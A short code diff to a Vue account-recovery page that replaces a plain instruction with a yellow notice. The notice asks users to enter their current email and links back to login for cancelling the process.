@@ -15,8 +15,15 @@
     <div class="w-full font-semibold text-lg">
       {{ $t('Find your account') }}
     </div>
-    <div class="w-full my-4 text-sm text-gray-500">
-      {{ $t('Enter your email address to search for your account.') }}
+    <div class="my-2 mb-5 border p-2 border-yellow-500 bg-yellow-100 text-sm">
+      {{
+        $t(
+          "To get back in to your account, enter your current Email if you know it. If you don't think that your account was hacked, you can",
+        )
+      }}
+      <a class="text-[#0064E0]" href="/login">
+        {{ $t('cancel this process') }}
+      </a>
     </div>
     <form class="w-full" @submit.prevent="handleSubmit">
       <div
